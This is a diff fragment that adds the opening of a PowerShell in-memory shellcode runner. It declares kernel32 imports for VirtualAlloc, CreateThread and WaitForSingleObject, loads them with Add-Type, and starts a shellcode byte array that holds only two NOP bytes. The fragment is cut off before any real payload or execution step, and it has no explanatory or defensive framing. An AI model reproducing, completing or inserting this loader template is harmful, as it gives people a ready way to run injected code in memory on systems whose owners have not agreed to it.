@@ -1,0 +1,4 @@
+$sig = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h, uint m);'
+Add-Type -MemberDefinition $sig -Name W -Namespace N
+[Byte[]] $code = 0x90,0x90
+
